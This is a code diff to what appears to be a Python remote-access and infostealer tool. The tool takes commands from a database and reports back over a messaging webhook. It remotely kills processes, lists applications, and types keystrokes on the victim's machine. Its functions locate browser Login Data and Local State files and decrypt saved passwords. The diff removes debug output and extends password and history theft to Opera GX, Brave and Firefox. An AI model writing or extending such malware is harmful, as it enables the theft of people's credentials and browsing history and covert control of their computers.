@@ -61,7 +61,6 @@ def watch_changes():
         type = data.get("type")
 
         if name == COMPUTER_ID:
-            print("sddgdfg")
             send_to_express(f"`✅` Successfully received `{type}` request!", COMPUTER_ID)
             match type and type.strip().lower():
                 case "winr":
@@ -140,7 +139,6 @@ def watch_changes():
                             send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_ID)
                         except Exception as e:
                             send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_ID)
-                            print(e)
 
                 case "applications":
                     send_to_express(list_open_apps(), COMPUTER_ID, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)
@@ -183,7 +181,6 @@ def watch_changes():
                             send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_ID)
                         except Exception as e:
                             send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_ID)
-                            print(e)
                     elif activity == "key":
                         try:
                             if content in pyautogui.KEYBOARD_KEYS:
@@ -193,7 +190,6 @@ def watch_changes():
                                 send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_ID)
                         except Exception as e:
                             send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_ID)
-                            print(e)
                     elif activity == "list":
                         try:
                             excluded_keys = set("!\"#$%&'()*+,-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
@@ -202,12 +198,10 @@ def watch_changes():
                             send_to_express(keys_list, computer_id=COMPUTER_ID, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
                         except Exception as e:
                             send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_ID)
-                            print(e)
 
             document_id = data.get("_id")
             if document_id:
                 collection.delete_one({"_id": document_id})
-                print(f"Document with ID {document_id} has been removed!")
 
 def run_watch():
     thread = threading.Thread(target=watch_changes)
@@ -551,12 +545,16 @@ def get_full_app_name(app_name_part):
 
 def get_browser_history(browser="chrome", limit=10):
     try:
-        if browser == "edge":
-            history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
-        elif browser == "opera":
-            history_db = os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Default\History')
-        else:
-            history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
+        history_db_paths = {
+            "edge": os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History'),
+            "opera": os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Default\History'),
+            "gx": os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable\Default\History'),
+            "brave": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History'),
+            "firefox": os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles\default\places.sqlite'),  # Firefox ma SQLite dla historii
+            "chrome": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
+        }
+
+        history_db = history_db_paths.get(browser)
 
         if not os.path.exists(history_db):
             raise FileNotFoundError(f"History file not found: {history_db}")
@@ -585,12 +583,16 @@ def get_browser_history(browser="chrome", limit=10):
 
 def get_encryption_key(browser="chrome"):
     try:
-        if browser == "edge":
-            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
-        elif browser == "opera":
-            local_state_path = os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Local State")
-        else:
-            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
+        local_state_paths = {
+            "edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State"),
+            "opera": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Local State"),
+            "gx": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera GX Stable\Local State"),
+            "brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Local State"),
+            "firefox": os.path.join(os.getenv("APPDATA"), r"Mozilla\Firefox\Profiles"),  # Firefox nie ma "Local State", ale dla przykładu
+            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
+        }
+
+        local_state_path = local_state_paths.get(browser)
         
         if not os.path.exists(local_state_path):
             raise FileNotFoundError(f"Local State file not found: {local_state_path}")
@@ -617,12 +619,16 @@ def decrypt_password(encrypted_password, key):
 
 def get_browser_passwords(browser="chrome"):
     try:
-        if browser == "edge":
-            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
-        elif browser == "opera":
-            db_path = os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Default\Login Data")
-        else:
-            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
+        browser_paths = {
+            "edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data"),
+            "opera": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Default\Login Data"),
+            "gx": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera GX Stable\Default\Login Data"),
+            "brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
+            "firefox": os.path.join(os.getenv("APPDATA"), r"Mozilla\Firefox\Profiles"),
+            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
+        }
+
+        db_path = browser_paths.get(browser)
 
         if not os.path.exists(db_path):
             raise FileNotFoundError(f"Database file not found: {db_path}")
